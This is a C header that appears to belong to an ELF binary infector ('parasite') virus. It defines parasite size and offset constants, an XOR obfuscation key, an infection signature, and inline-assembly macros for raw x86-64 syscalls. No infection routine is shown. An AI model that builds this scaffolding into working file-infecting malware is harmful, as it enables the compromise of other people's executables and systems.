#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <error.h>
#include <dirent.h>
#include <elf.h>


#define _4KB_PAGE           0x1000
#define _4KB_OFFSET_MASK    0xfff
#define PAGE_SIZE           _4KB_PAGE
#define PAGE_OFFSET_MASK    _4KB_OFFSET_MASK

#define PAGE_ALIGN_LOW(vaddr)    ((vaddr) & ~PAGE_OFFSET_MASK)
#define PAGE_ALIGN_HIGH(vaddr)   (PAGE_ALIGN_LOW(vaddr) + PAGE_SIZE)
#define VADDR_OFFSET(vaddr)      ((vaddr) & PAGE_OFFSET_MASK)


#define PI_MM_ALLOCATED     0x1
#define PI_MM_FREE          0x0
#define PI_MM_POOL_SZ       0x8000
#define PI_POISON_PTR       0x0

#define STRING_EQUAL        0x0
#define STRING_NOT_EQUAL    !STRING_EQUAL

#define MEM_EQUAL           0x0
#define MEM_NOT_EQUAL       !MEM_EQUAL

#define DIRENTS_BUF_SIZE    0x8000


#define PARASITE_ENTRY_SIZE 0x1b
#define PARASITE_OFFSET_1   0x1f
#define PARASITE_OFFSET_2   0x26
#define PARASITE_OFFSET_3   0x2b
#define PARASITE_OFFSET_4   0x50
#define PARASITE_OFFSET_5   0x54
#define PARASITE_LEN        0x60

#define PI_XOR_KEY          0x78

#define PI_OPERATION_SUCCESS  0
#define PI_OPERATION_ERROR   -1

#define PI_SIGNATURE 0x10

#define inline_function __attribute__((always_inline)) inline


#define pi_check_syscall_fault(x)  \
    if ((int64_t)x < 0)            \
        return PI_OPERATION_ERROR  \

/*
 * macro functions to avoid code repeating
*/
#define pi_define_syscall_1(syscall_name,syscall_num,type1,arg1)  \
    int64_t pi_##syscall_name(type1 arg1)                         \
    {                                                             \
        int64_t __ret;                                            \
                                                                  \
        __asm__ volatile                                          \
            (                                                     \
             "movq  %0,%%rdi                    \n"               \
             "movq  $"#syscall_num",%%rax       \n"               \
             "syscall                           \n"               \
             :                                                    \
             : "g" (arg1)                                         \
            );                                                    \
                                                                  \
        __asm__                                                   \
            (                                                     \
             "movq  %%rax,%0"                                     \
             : "=g" (__ret)                                       \
            );                                                    \
                                                                  \
        return __ret;                                             \
    }

#define pi_define_syscall_2(syscall_name,syscall_num,type1,arg1,type2,arg2) \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2)                        \
    {                                                                       \
        int64_t __ret;                                                      \
                                                                            \
        __asm__ volatile                                                    \
            (                                                               \
             "movq  %0,%%rdi                    \n"                         \
             "movq  %1,%%rsi                    \n"                         \
             "movq  $"#syscall_num",%%rax       \n"                         \
             "syscall"                                                      \
             :                                                              \
             : "g" (arg1), "g" (arg2)                                       \
            );                                                              \
                                                                            \
        __asm__                                                             \
            (                                                               \
             "movq  %%rax,%0"                                               \
             : "=g" (__ret)                                                 \
            );                                                              \
                                                                            \
        return __ret;                                                       \
    }

#define pi_define_syscall_3(syscall_name,syscall_num,type1,arg1,type2,arg2,type3,arg3)  \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2,type3 arg3)                         \
    {                                                                                   \
        int64_t __ret;                                                                  \
                                                                                        \
        __asm__ volatile                                                                \
            (                                                                           \
             "movq  %0,%%rdi                    \n"                                     \
             "movq  %1,%%rsi                    \n"                                     \
             "movq  %2,%%rdx                    \n"                                     \
             "movq  $"#syscall_num",%%rax       \n"                                     \
             "syscall"                                                                  \
             :                                                                          \
             : "g" (arg1), "g" (arg2), "g" (arg3)                                       \
            );                                                                          \
                                                                                        \
        __asm__                                                                         \
            (                                                                           \
             "movq  %%rax,%0"                                                           \
             : "=g" (__ret)                                                             \
            );                                                                          \
                                                                                        \
        return __ret;                                                                   \
    }

